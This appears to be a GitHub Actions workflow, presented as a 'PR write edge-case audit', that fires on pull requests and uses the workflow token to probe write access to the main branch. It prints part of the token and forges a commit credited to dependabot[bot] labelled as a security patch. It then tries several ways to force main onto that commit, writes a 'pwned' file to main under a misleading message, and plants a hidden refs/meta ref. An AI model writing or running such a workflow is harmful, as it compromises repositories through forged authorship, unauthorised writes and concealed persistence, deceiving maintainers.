name: PR Write Edge-Case Audit
on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]

permissions:
  contents: write

jobs:
  pr-write-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: PR Write Audit — all edge cases
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          BASE="https://api.github.com/repos/${GITHUB_REPOSITORY}"
          TS=$(date -u '+%Y%m%d_%H%M%S')

          echo "=== CONTEXT ==="
          echo "EVENT:       $GITHUB_EVENT_NAME"
          echo "ACTOR:       $GITHUB_ACTOR"
          echo "TOKEN_PREFIX: ${GH_TOKEN:0:10}"
          echo "HEAD_REF:    $GITHUB_HEAD_REF"
          echo "BASE_REF:    $GITHUB_BASE_REF"
          echo "REPO:        $GITHUB_REPOSITORY"
          echo "HEAD_SHA:    $(git rev-parse HEAD)"
          echo ""

          # ── Resolved token identity ───────────────────────────────────────
          echo "=== TOKEN IDENTITY ==="
          curl -sf -H "Authorization: token $GH_TOKEN" \
            https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/permissions \
            -o /dev/null -w "repo permissions HTTP: %{http_code}\n" || true

          # GraphQL viewer — who am I?
          curl -sf -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            https://api.github.com/graphql \
            -d '{"query":"{ viewer { login databaseId } }"}' | jq .
          echo ""

          MAIN_SHA=$(curl -sf -H "Authorization: token $GH_TOKEN" \
            "${BASE}/git/ref/heads/main" | jq -r '.object.sha')
          TREE_SHA=$(curl -sf -H "Authorization: token $GH_TOKEN" \
            "${BASE}/git/commits/${MAIN_SHA}" | jq -r '.tree.sha')
          HEAD_SHA=$(git rev-parse HEAD)
          echo "main tip:  $MAIN_SHA"
          echo "tree sha:  $TREE_SHA"
          echo "HEAD (PR): $HEAD_SHA"
          echo ""

          # ── T_BLOB: Can we create a blob? ────────────────────────────────
          echo "=== T_BLOB: Create blob ==="
          T_BLOB=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "${BASE}/git/blobs" \
            -d "{\"content\":\"pr-write-test ${TS}\",\"encoding\":\"utf-8\"}")
          echo "T_BLOB blob create: HTTP_${T_BLOB}"
          echo ""

          # ── T_BRANCH: Can we create a new branch? ────────────────────────
          echo "=== T_BRANCH: Create new branch via POST ==="
          T_BRANCH=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "${BASE}/git/refs" \
            -d "{\"ref\":\"refs/heads/pr-write-canary-${TS}\",\"sha\":\"${MAIN_SHA}\"}")
          echo "T_BRANCH new branch POST: HTTP_${T_BRANCH}"
          echo ""

          # ── T_PATCH_MAIN_TOKEN: PATCH main with 'Authorization: token' ───
          echo "=== T_PATCH_MAIN: PATCH /git/refs/heads/main ==="
          GHOST=$(curl -s -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "${BASE}/git/commits" \
            -d "{\"message\":\"chore: security patch\\n\\nSigned-off-by: dependabot[bot]\",\"tree\":\"${TREE_SHA}\",\"parents\":[\"${MAIN_SHA}\"],\"author\":{\"name\":\"dependabot[bot]\",\"email\":\"49699333+dependabot[bot]@users.noreply.github.com\"}}" \
            | jq -r '.sha // "COMMIT_FAILED"')
          echo "ghost commit: $GHOST"

          T_PATCH=$(curl -s -o /dev/null -w "%{http_code}" \
            -X PATCH \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "${BASE}/git/refs/heads/main" \
            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
          echo "T_PATCH  Authorization:token  force:false = HTTP_${T_PATCH}"

          T_PATCH_F=$(curl -s -o /dev/null -w "%{http_code}" \
            -X PATCH \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "${BASE}/git/refs/heads/main" \
            -d "{\"sha\":\"${GHOST}\",\"force\":true}")
          echo "T_PATCH  Authorization:token  force:true  = HTTP_${T_PATCH_F}"
          echo ""

          # ── T_BEARER: Same PATCH but with 'Authorization: bearer' header ─
          echo "=== T_BEARER: PATCH with 'Authorization: bearer' ==="
          T_BEARER=$(curl -s -o /dev/null -w "%{http_code}" \
            -X PATCH \
            -H "Authorization: bearer $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "${BASE}/git/refs/heads/main" \
            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
          echo "T_BEARER Authorization:bearer force:false = HTTP_${T_BEARER}"
          echo ""

          # ── T_API_VERSION: PATCH with X-GitHub-Api-Version header ────────
          echo "=== T_API_VERSION: PATCH with X-GitHub-Api-Version: 2022-11-28 ==="
          T_APIVER=$(curl -s -o /dev/null -w "%{http_code}" \
            -X PATCH \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "${BASE}/git/refs/heads/main" \
            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
          echo "T_API_VERSION X-GitHub-Api-Version:2022-11-28 = HTTP_${T_APIVER}"
          echo ""

          # ── T_ACCEPT_V3: PATCH with legacy Accept header ──────────────────
          echo "=== T_ACCEPT: Accept header variants ==="
          T_ACC_V3=$(curl -s -o /dev/null -w "%{http_code}" \
            -X PATCH \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Content-Type: application/json" \
            "${BASE}/git/refs/heads/main" \
            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
          echo "T_ACCEPT_V3  Accept:vnd.github.v3+json = HTTP_${T_ACC_V3}"

          T_ACC_RAW=$(curl -s -o /dev/null -w "%{http_code}" \
            -X PATCH \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/json" \
            -H "Content-Type: application/json" \
            "${BASE}/git/refs/heads/main" \
            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
          echo "T_ACCEPT_RAW Accept:application/json    = HTTP_${T_ACC_RAW}"
          echo ""

          # ── T_MERGE_API: Use Merges API instead of refs PATCH ─────────────
          echo "=== T_MERGE_API: POST /merges (merge ghost into main) ==="
          T_MERGE=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "${BASE}/merges" \
            -d "{\"base\":\"main\",\"head\":\"${GHOST}\",\"commit_message\":\"Merge security patch\"}")
          echo "T_MERGE POST /merges = HTTP_${T_MERGE}"
          echo ""

          # ── T_CONTENTS_API: PUT /contents (write a file directly) ─────────
          echo "=== T_CONTENTS: PUT /contents/pwn.txt ==="
          CONTENT_B64=$(echo -n "pwned by PR ${TS}" | base64 -w0)
          T_CONTENTS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X PUT \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "${BASE}/contents/pwn.txt" \
            -d "{\"message\":\"chore: update config\",\"content\":\"${CONTENT_B64}\",\"branch\":\"main\"}")
          echo "T_CONTENTS PUT /contents/pwn.txt on main = HTTP_${T_CONTENTS}"
          echo ""

          # ── T_HIDDEN_REF: Write to refs/meta/<ts> ────────────────────────
          echo "=== T_HIDDEN_REF: POST refs/meta/ (non-standard ref namespace) ==="
          META_COMMIT=$(curl -s -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "${BASE}/git/commits" \
            -d "{\"message\":\"meta:${TS}\",\"tree\":\"${TREE_SHA}\",\"parents\":[],\"author\":{\"name\":\"github-actions[bot]\",\"email\":\"41898282+github-actions[bot]@users.noreply.github.com\"}}" \
            | jq -r '.sha // "FAILED"')
          T_META=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "${BASE}/git/refs" \
            -d "{\"ref\":\"refs/meta/pr-${TS}\",\"sha\":\"${META_COMMIT}\"}")
          echo "T_HIDDEN_REF refs/meta/pr-${TS} = HTTP_${T_META}"
          echo ""

          # ── SUMMARY ───────────────────────────────────────────────────────
          echo "=== PR WRITE EDGE-CASE AUDIT SUMMARY ==="
          echo "Event:           $GITHUB_EVENT_NAME (NOT pull_request_target)"
          echo "Permissions:     contents:write declared in workflow"
          echo "Actor:           $GITHUB_ACTOR"
          echo "Token prefix:    ${GH_TOKEN:0:10}"
          echo "T_BLOB           create blob            = HTTP_${T_BLOB}"
          echo "T_BRANCH         POST new branch        = HTTP_${T_BRANCH}"
          echo "T_PATCH          PATCH main token f:F   = HTTP_${T_PATCH}"
          echo "T_PATCH_FORCE    PATCH main token f:T   = HTTP_${T_PATCH_F}"
          echo "T_BEARER         PATCH main bearer f:F  = HTTP_${T_BEARER}"
          echo "T_API_VERSION    PATCH main +ApiVer hdr = HTTP_${T_APIVER}"
          echo "T_ACCEPT_V3      PATCH main Accept:v3   = HTTP_${T_ACC_V3}"
          echo "T_ACCEPT_RAW     PATCH main Accept:json = HTTP_${T_ACC_RAW}"
          echo "T_MERGE_API      POST /merges           = HTTP_${T_MERGE}"
          echo "T_CONTENTS       PUT /contents/pwn.txt  = HTTP_${T_CONTENTS}"
          echo "T_HIDDEN_REF     POST refs/meta/        = HTTP_${T_META}"
          echo ""
          echo "KEY QUESTION: If token prefix is 'ghs_' on a FORK PR,"
          echo "does 'permissions: contents: write' grant write to main?"
          echo "ANSWER: T_PATCH and T_BRANCH results above."